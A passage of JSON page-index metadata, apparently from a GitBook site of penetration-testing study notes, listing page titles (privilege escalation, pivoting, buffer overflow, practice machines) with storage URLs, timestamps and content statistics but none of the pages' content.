Checklist","path":"my-checklist","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-M45CqcOCL1A9M9tKPrA%2Fdocument.json?alt=media\u0026token=68d5c9dd-d623-4b28-b739-4ffe0d31baeb","createdAt":1586020968985,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586021069797,"updatedAt":1593520598673,"count":3}},"github":null,"stats":{"words":0,"images":0,"codeLines":329,"revisions":0},"pages":null},"-LpHFiW77L8u8OsNLSn5":{"uid":"-LpHFiW77L8u8OsNLSn5","kind":"document","title":"Transfer files on linux","path":"transfer-files-on-linux","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-LpHFiW77L8u8OsNLSn5%2Fdocument.json?alt=media\u0026token=aa686729-6efb-42b5-bb8a-5c7efdcabb1e","createdAt":1569043179592,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1593520593146,"count":3}},"github":null,"stats":{"words":462,"images":0,"codeLines":78,"revisions":2},"pages":null},"-LlbCnHt3EACqe-gRQju":{"uid":"-LlbCnHt3EACqe-gRQju","kind":"document","title":"Priv Escalation","path":"priv-escalation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2Fmaster%2F-LlbCnHt3EACqe-gRQju%2Fdocument.json?alt=media\u0026token=87f5a124-1c14-4727-8ae3-eb0adccd501f","createdAt":1565099766970,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565100139502,"updatedAt":1586022489766,"count":7}},"github":null,"stats":{"words":161,"images":0,"codeLines":111,"revisions":6},"pages":["-Lpy2EUmQu_ghM39Hc0w","-Lpy2JoecZHqphwI4PZ_"]},"-Lpy2EUmQu_ghM39Hc0w":{"uid":"-Lpy2EUmQu_ghM39Hc0w","kind":"document","title":"Linux Priv Escalation","path":"linux-priv-escalation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2Fmaster%2F-Lpy2EUmQu_ghM39Hc0w%2Fdocument.json?alt=media\u0026token=68a5170e-1633-4e6e-ba9f-93b281d65067","createdAt":1569777842162,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777922163,"updatedAt":1586022489730,"count":2}},"github":null,"stats":{"words":10,"images":3,"codeLines":70,"revisions":1},"pages":["-LuzlAv-HgVc2X-Rnw2u","-LpHo0ijELqS8oYu66f1","-Lv5ysK3uzqMMcZEUSYn"]},"-LuzlAv-HgVc2X-Rnw2u":{"uid":"-LuzlAv-HgVc2X-Rnw2u","kind":"document","title":"g0tmi1k linux privilege escalation","path":"gotmik-linux-privilege-escalation","href":null,"description":"https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Luzl88gcHa8S_I9uFCC%2Fmaster%2F-LuzlAv-HgVc2X-Rnw2u%2Fdocument.json?alt=media\u0026token=3efb7ef5-f398-4b43-9a35-33c72679ee13","createdAt":1575175372480,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575175718494,"updatedAt":1575175718494,"count":1}},"github":null,"stats":{"words":2232,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LpHo0ijELqS8oYu66f1":{"uid":"-LpHo0ijELqS8oYu66f1","kind":"document","title":"Privilege Escalation - Linux","path":"privilege-escalation-linux","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHo0ijELqS8oYu66f1%2Fdocument.json?alt=media\u0026token=521e54db-aff0-45dd-9fee-ec3b6bccd060","createdAt":1569052433327,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913838,"updatedAt":1569052913838,"count":1}},"github":null,"stats":{"words":1272,"images":0,"codeLines":129,"revisions":1},"pages":null},"-Lv5ysK3uzqMMcZEUSYn":{"uid":"-Lv5ysK3uzqMMcZEUSYn","kind":"document","title":"Checklist - Linux Privilege Escalation","path":"checklist-linux-privilege-escalation","href":null,"description":"https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Lv5yoeTtTMl3YHXNbf_%2Fmaster%2F-Lv5ysK3uzqMMcZEUSYn%2Fdocument.json?alt=media\u0026token=b16d8c0f-8c42-4a38-b1da-ac111f1e6d06","createdAt":1575296402756,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575296496416,"updatedAt":1575296496416,"count":1}},"github":null,"stats":{"words":420,"images":0,"codeLines":0,"revisions":1},"pages":null},"-Lpy2JoecZHqphwI4PZ_":{"uid":"-Lpy2JoecZHqphwI4PZ_","kind":"document","title":"Windows Priv Escalation","path":"windows-priv-escalation","href":null,"description":"https://github.com/wwong99/windows-privilege-escalation","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Ly9vDrx7zijMFqCL0_j%2Fmaster%2F-Lpy2JoecZHqphwI4PZ_%2Fdocument.json?alt=media\u0026token=c5386fc9-d78d-45a3-b79e-17054e3e1ba2","createdAt":1569777863978,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777922162,"updatedAt":1578583891725,"count":2}},"github":null,"stats":{"words":7,"images":0,"codeLines":148,"revisions":2},"pages":["-Luzm3bOdycyi_GnVHkr","-LpHoHBtGCWxE8MI2NUG","-Lv5z1bG-t4ej2gCmTdL"]},"-Luzm3bOdycyi_GnVHkr":{"uid":"-Luzm3bOdycyi_GnVHkr","kind":"document","title":"Fuzzysecurity window priv escalation","path":"fuzzysecurity-window-priv-escalation","href":null,"description":"https://www.fuzzysecurity.com/tutorials/16.html","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2Fmaster%2F-Luzm3bOdycyi_GnVHkr%2Fdocument.json?alt=media\u0026token=8875302c-9d73-4ecc-886d-d293dafe32d3","createdAt":1575175604697,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575176631308,"updatedAt":1586022493718,"count":2}},"github":null,"stats":{"words":7696,"images":3,"codeLines":0,"revisions":1},"pages":null},"-LpHoHBtGCWxE8MI2NUG":{"uid":"-LpHoHBtGCWxE8MI2NUG","kind":"document","title":"Privilege Escalation - Windows","path":"privilege-escalation-windows","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHoHBtGCWxE8MI2NUG%2Fdocument.json?alt=media\u0026token=c863dfa5-a1dd-4e0a-8616-e80530d7b434","createdAt":1569052500793,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913848,"updatedAt":1569052913848,"count":1}},"github":null,"stats":{"words":1468,"images":0,"codeLines":189,"revisions":1},"pages":null},"-Lv5z1bG-t4ej2gCmTdL":{"uid":"-Lv5z1bG-t4ej2gCmTdL","kind":"document","title":"Checklist - Local Windows Privilege Escalation","path":"checklist-local-windows-privilege-escalation","href":null,"description":"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Lv5yoeTtTMl3YHXNbf_%2Fmaster%2F-Lv5z1bG-t4ej2gCmTdL%2Fdocument.json?alt=media\u0026token=07e6e58d-3bce-4c08-84db-e8d146a25f76","createdAt":1575296444881,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575296496416,"updatedAt":1575296496416,"count":1}},"github":null,"stats":{"words":349,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LpHnj-5p8xCl27TZUqO":{"uid":"-LpHnj-5p8xCl27TZUqO","kind":"document","title":"Post Exploitation","path":"post-exploitation","href":null,"description":"https://sushant747.gitbooks.io/","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LxfDwP8MdJnGgFKUjRk%2Fmaster%2F-LpHnj-5p8xCl27TZUqO%2Fdocument.json?alt=media\u0026token=0e5a6e38-a735-457b-908c-d3705a532c82","createdAt":1569052356614,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1578055683462,"count":2}},"github":null,"stats":{"words":424,"images":0,"codeLines":29,"revisions":2},"pages":["-LpHonEZYAelzkrnNJwH","-LpHogjXtTeHdBsy4IvW","-LpHobMkgZtdCHOc0Vpr","-LpHoU2GuJfTAukghuGK","-LpHoLcO6eoKqR9fPpuy","-LpHnv8wcbPY8L6aFkOc","-LpHno0MwMZj3XrC7ifW"]},"-LpHonEZYAelzkrnNJwH":{"uid":"-LpHonEZYAelzkrnNJwH","kind":"document","title":"Cover your tracks","path":"cover-your-tracks","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHonEZYAelzkrnNJwH%2Fdocument.json?alt=media\u0026token=2cf7ae0c-51ac-4067-a722-16149f76ab27","createdAt":1569052636132,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913841,"updatedAt":1569052913841,"count":1}},"github":null,"stats":{"words":168,"images":0,"codeLines":14,"revisions":1},"pages":null},"-LpHogjXtTeHdBsy4IvW":{"uid":"-LpHogjXtTeHdBsy4IvW","kind":"document","title":"Persistence","path":"persistence","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W-ZG6TM66-YNS3K9%2Fmaster%2F-LpHogjXtTeHdBsy4IvW%2Fdocument.json?alt=media\u0026token=62fe2545-caa3-411e-9a15-198714e7fa4e","createdAt":1569052609506,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913848,"updatedAt":1593575741985,"count":2}},"github":null,"stats":{"words":422,"images":0,"codeLines":20,"revisions":1},"pages":null},"-LpHobMkgZtdCHOc0Vpr":{"uid":"-LpHobMkgZtdCHOc0Vpr","kind":"document","title":"Loot Linux","path":"loot-linux","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHobMkgZtdCHOc0Vpr%2Fdocument.json?alt=media\u0026token=6fdcfb4f-28cc-45ae-a7f2-425334f9da54","createdAt":1569052587505,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1569052913840,"count":1}},"github":null,"stats":{"words":384,"images":0,"codeLines":27,"revisions":1},"pages":null},"-LpHoU2GuJfTAukghuGK":{"uid":"-LpHoU2GuJfTAukghuGK","kind":"document","title":"Loot Windows","path":"loot-windows","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W1_E0N8_xLl6rEtT%2Fmaster%2F-LpHoU2GuJfTAukghuGK%2Fdocument.json?alt=media\u0026token=bf043648-0986-483a-bb23-31be0d6f48aa","createdAt":1569052553426,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1593576226801,"count":2}},"github":null,"stats":{"words":412,"images":0,"codeLines":34,"revisions":1},"pages":null},"-LpHoLcO6eoKqR9fPpuy":{"uid":"-LpHoLcO6eoKqR9fPpuy","kind":"document","title":"Escaping Restricted Shell","path":"escaping-restricted-shell","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHoLcO6eoKqR9fPpuy%2Fdocument.json?alt=media\u0026token=af457acb-6606-472d-9fe6-ac490930a18b","createdAt":1569052518937,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913849,"updatedAt":1569052913849,"count":1}},"github":null,"stats":{"words":95,"images":0,"codeLines":9,"revisions":1},"pages":null},"-LpHnv8wcbPY8L6aFkOc":{"uid":"-LpHnv8wcbPY8L6aFkOc","kind":"document","title":"Meterpreter shell for post-exploitation","path":"meterpreter-shell-for-post-exploitation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W1_E0N8_xLl6rEtT%2Fmaster%2F-LpHnv8wcbPY8L6aFkOc%2Fdocument.json?alt=media\u0026token=ab883a08-29e5-4cdf-8fd2-e89607580e0b","createdAt":1569052406396,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913849,"updatedAt":1593576226865,"count":2}},"github":null,"stats":{"words":421,"images":0,"codeLines":19,"revisions":1},"pages":null},"-LpHno0MwMZj3XrC7ifW":{"uid":"-LpHno0MwMZj3XrC7ifW","kind":"document","title":"Spawn Shell","path":"spawn-shell","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHno0MwMZj3XrC7ifW%2Fdocument.json?alt=media\u0026token=01625e5d-477a-4cbb-ba2e-6bade9a3336e","createdAt":1569052377175,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1569052913842,"count":1}},"github":null,"stats":{"words":258,"images":0,"codeLines":6,"revisions":1},"pages":null},"-LlbcRH7gYQzJ2RNcm1O":{"uid":"-LlbcRH7gYQzJ2RNcm1O","kind":"document","title":"Pivoting","path":"pivoting","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W1_E0N8_xLl6rEtT%2Fmaster%2F-LlbcRH7gYQzJ2RNcm1O%2Fdocument.json?alt=media\u0026token=1800748c-1474-4593-a38c-e9b37102524e","createdAt":1565106750601,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565108220361,"updatedAt":1593576226642,"count":3}},"github":null,"stats":{"words":460,"images":0,"codeLines":11,"revisions":2},"pages":["-M45VJBQb9G6JQiRhBGT","-LxfC-P-dbx3HYGTqTel","-LvJGPhDd1kqCS-PrIHr"]},"-M45VJBQb9G6JQiRhBGT":{"uid":"-M45VJBQb9G6JQiRhBGT","kind":"document","title":"My Checklist for Pivoting","path":"my-checklist-for-pivoting","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45Nd76_rMHFAGsp5Qj%2Fmaster%2F-M45VJBQb9G6JQiRhBGT%2Fdocument.json?alt=media\u0026token=7c93a19a-d5f7-43c7-b87f-7a70a5c84b39","createdAt":1586025808667,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586027515352,"updatedAt":1586027515352,"count":1}},"github":null,"stats":{"words":0,"images":1,"codeLines":0,"revisions":0},"pages":null},"-LxfC-P-dbx3HYGTqTel":{"uid":"-LxfC-P-dbx3HYGTqTel","kind":"document","title":"Tunneling and Port Forwarding","path":"tunneling-and-port-forwarding","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W1_E0N8_xLl6rEtT%2Fmaster%2F-LxfC-P-dbx3HYGTqTel%2Fdocument.json?alt=media\u0026token=261a0131-704b-40ad-895e-88ef76480bd6","createdAt":1578051569280,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578052069654,"updatedAt":1593576225005,"count":3}},"github":null,"stats":{"words":303,"images":0,"codeLines":15,"revisions":2},"pages":null},"-LvJGPhDd1kqCS-PrIHr":{"uid":"-LvJGPhDd1kqCS-PrIHr","kind":"document","title":"Pivotind understanding","path":"pivotind-understanding","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7W1_E0N8_xLl6rEtT%2Fmaster%2F-LvJGPhDd1kqCS-PrIHr%2Fdocument.json?alt=media\u0026token=123efdb7-3071-4f79-b40a-0356d2116a53","createdAt":1575519365966,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575519408543,"updatedAt":1593576224616,"count":2}},"github":null,"stats":{"words":459,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LlbD4Y-NU9RLzKRgBqw":{"uid":"-LlbD4Y-NU9RLzKRgBqw","kind":"document","title":"Buffer Overflow","path":"buffer-overflow","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LxlufQITeQXTdfNGykU%2Fmaster%2F-LlbD4Y-NU9RLzKRgBqw%2Fdocument.json?alt=media\u0026token=621749fa-0bf1-4f16-975a-dfda70da7796","createdAt":1565099841728,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565100139501,"updatedAt":1578209669742,"count":2}},"github":null,"stats":{"words":15,"images":0,"codeLines":51,"revisions":2},"pages":["-Ly9nS38ZE6Dk-kDZwrU","-LtubLCqYtNpBrNTiaSe"]},"-Ly9nS38ZE6Dk-kDZwrU":{"uid":"-Ly9nS38ZE6Dk-kDZwrU","kind":"document","title":"Buffer overflow","path":"buffer-overflow","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Ly9awauAuI55Boyu0z5%2Fmaster%2F-Ly9nS38ZE6Dk-kDZwrU%2Fdocument.json?alt=media\u0026token=6cfb0bef-7021-4f03-b59b-c802fff63c27","createdAt":1578581741834,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578581999255,"updatedAt":1578581999255,"count":1}},"github":null,"stats":{"words":612,"images":0,"codeLines":149,"revisions":1},"pages":null},"-LtubLCqYtNpBrNTiaSe":{"uid":"-LtubLCqYtNpBrNTiaSe","kind":"document","title":"Buffer overflow Step by Step","path":"buffer-overflow-step-by-step","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7XsUNQDUZ9Ndaq0Vu%2Fmaster%2F-LtubLCqYtNpBrNTiaSe%2Fdocument.json?alt=media\u0026token=639c7b66-6b42-45b8-8332-614306d3c2c2","createdAt":1574015165302,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1574015518323,"updatedAt":1593582106869,"count":3}},"github":null,"stats":{"words":401,"images":0,"codeLines":0,"revisions":1},"pages":["-LtucbEkIviAU2WDvee0","-LtucPHiadYLpyOk-C2g","-LtucJlYcfd9xl-gnmA_","-LtucCNgDR9hd5BTpRIB"]},"-LtucbEkIviAU2WDvee0":{"uid":"-LtucbEkIviAU2WDvee0","kind":"document","title":"Study about buffer overflow","path":"study-about-buffer-overflow","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LtubD75cmB88eQr9H7y%2Fmaster%2F-LtucbEkIviAU2WDvee0%2Fdocument.json?alt=media\u0026token=addac06e-b6d2-49ff-ad69-91c8ce59eb88","createdAt":1574015497201,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1574015518323,"updatedAt":1574015518323,"count":1}},"github":null,"stats":{"words":595,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LtucPHiadYLpyOk-C2g":{"uid":"-LtucPHiadYLpyOk-C2g","kind":"document","title":"Brainpan","path":"brainpan","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LtubD75cmB88eQr9H7y%2Fmaster%2F-LtucPHiadYLpyOk-C2g%2Fdocument.json?alt=media\u0026token=9a218db5-4736-45a4-84fc-00c5cca4738f","createdAt":1574015444142,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1574015518325,"updatedAt":1574015518325,"count":1}},"github":null,"stats":{"words":481,"images":0,"codeLines":0,"revisions":1},"pages":null},"-LtucJlYcfd9xl-gnmA_":{"uid":"-LtucJlYcfd9xl-gnmA_","kind":"document","title":"VulnServer","path":"vulnserver","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7XsUNQDUZ9Ndaq0Vu%2Fmaster%2F-LtucJlYcfd9xl-gnmA_%2Fdocument.json?alt=media\u0026token=cff979d9-f6c9-4f41-8856-8ae7555daaef","createdAt":1574015421539,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1574015518325,"updatedAt":1593582106506,"count":3}},"github":null,"stats":{"words":34,"images":0,"codeLines":2,"revisions":1},"pages":null},"-LtucCNgDR9hd5BTpRIB":{"uid":"-LtucCNgDR9hd5BTpRIB","kind":"document","title":"Minishare","path":"minishare","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7XsUNQDUZ9Ndaq0Vu%2Fmaster%2F-LtucCNgDR9hd5BTpRIB%2Fdocument.json?alt=media\u0026token=33f6048b-9241-4e41-9f75-0adf6707b579","createdAt":1574015391276,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1574015518324,"updatedAt":1593582104732,"count":3}},"github":null,"stats":{"words":451,"images":0,"codeLines":5,"revisions":1},"pages":null},"-M45dLL4t8rX3h9kosr5":{"uid":"-M45dLL4t8rX3h9kosr5","kind":"document","title":"Main Tools","path":"main-tools","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45apK78_qDGTONVCWF%2Fmaster%2F-M45dLL4t8rX3h9kosr5%2Fdocument.json?alt=media\u0026token=63583dd9-c6bf-4264-8a6d-449b7c92abae","createdAt":1586028176774,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586028619081,"updatedAt":1586028619081,"count":1}},"github":null,"stats":{"words":0,"images":0,"codeLines":47,"revisions":0},"pages":null},"-Llb84q7yuuTq5WpbOWn":{"uid":"-Llb84q7yuuTq5WpbOWn","kind":"document","title":"MISC","path":"misc","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7XsUNQDUZ9Ndaq0Vu%2Fmaster%2F-Llb84q7yuuTq5WpbOWn%2Fdocument.json?alt=media\u0026token=efbc6207-3ef7-4fb2-856a-30f1cf20ada1","createdAt":1565098532232,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565099294413,"updatedAt":1593582105047,"count":4}},"github":null,"stats":{"words":39,"images":0,"codeLines":45,"revisions":3},"pages":["-LpHndl8IH-q5mGg6Rey"]},"-LpHndl8IH-q5mGg6Rey":{"uid":"-LpHndl8IH-q5mGg6Rey","kind":"document","title":"Exploit Compiling","path":"exploit-compiling","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHndl8IH-q5mGg6Rey%2Fdocument.json?alt=media\u0026token=78fb1b9b-1e2c-425e-a1fa-11b27e4b9a81","createdAt":1569052335177,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1569052913839,"count":1}},"github":null,"stats":{"words":15,"images":0,"codeLines":2,"revisions":1},"pages":null},"-LxfQODCrRXhSMxAEJjc":{"uid":"-LxfQODCrRXhSMxAEJjc","kind":"document","title":"CheatSheet (Short)","path":"cheatsheet-short","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB7XsUNQDUZ9Ndaq0Vu%2Fmaster%2F-LxfQODCrRXhSMxAEJjc%2Fdocument.json?alt=media\u0026token=e498a3bd-f856-4189-ad37-00a9ff428cad","createdAt":1578055340941,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578055683462,"updatedAt":1593582105998,"count":4}},"github":null,"stats":{"words":21,"images":0,"codeLines":364,"revisions":3},"pages":null},"-Lpy08ScFzY55tjQajjf":{"uid":"-Lpy08ScFzY55tjQajjf","kind":"document","title":"OSCP/ Vulnhub Practice learning","path":"htb-learning","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M44yYvWJg7Sq0CrczQH%2Fmaster%2F-Lpy08ScFzY55tjQajjf%2Fdocument.json?alt=media\u0026token=094735b4-12f5-418c-9666-5f2d8350d7a7","createdAt":1569777293160,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777334172,"updatedAt":1586020876676,"count":19}},"github":null,"stats":{"words":202,"images":5,"codeLines":0,"revisions":18},"pages":["-M458nZRQWy57-rqBo9l","-LwGlsQ-yalBRT-OFsrk","-Lvcf8w0aWaCi1E7SheB","-LxeMNK7Duf3PKUHJZN2","-LxdXrGDX8wj7PperJup"]},"-M458nZRQWy57-rqBo9l":{"uid":"-M458nZRQWy57-rqBo9l","kind":"document","title":"Machines Practice","path":"machines-practice","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M44yYvWJg7Sq0CrczQH%2Fmaster%2F-M458nZRQWy57-rqBo9l%2Fdocument.json?alt=media\u0026token=8b98bc6a-7a6c-4c59-b19c-ddb6fdf06c47","createdAt":1586019907868,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586020878425,"updatedAt":1586020878425,"count":1}},"github":null,"stats":{"words":1847,"images":0,"codeLines":63,"revisions":0},"pages":null},"-LwGlsQ-yalBRT-OFsrk":{"uid":"-LwGlsQ-yalBRT-OFsrk","kind":"document","title":"My Practice on HTB Windows boxes","path":"htb-windows","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Lxf81zZUx9rpagvxI4_%2Fmaster%2F-LwGlsQ-yalBRT-OFsrk%2Fdocument.json?alt=media\u0026token=ba17cde3-2d2f-4e34-9691-57d76e277908","createdAt":1576551286464,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1576551350328,"updatedAt":1578052069651,"count":8}},"github":null,"stats":{"words":6060,"images":0,"codeLines":56,"revisions":8},"pages":null},"-Lvcf8w0aWaCi1E7SheB":{"uid":"-Lvcf8w0aWaCi1E7SheB","kind":"document","title":"My Practice on Vulnhub boxes","path":"vulnhub-boxes","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LxuqkF6F6ojc_8W0oLQ%2Fmaster%2F-Lvcf8w0aWaCi1E7SheB%2Fdocument.json?alt=media\u0026token=a9f4645f-96ed-478d-b195-86f74eddaa5a","createdAt":1575861657345,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1575863493579,"updatedAt":1578315728039,"count":7}},"github":null,"stats":{"words":7867,"images":0,"codeLines":415,"revisions":7},"pages":null},"-LxeMNK7Duf3PKUHJZN2":{"uid":"-LxeMNK7Duf3PKUHJZN2","kind":"document","title":"Over the Wire 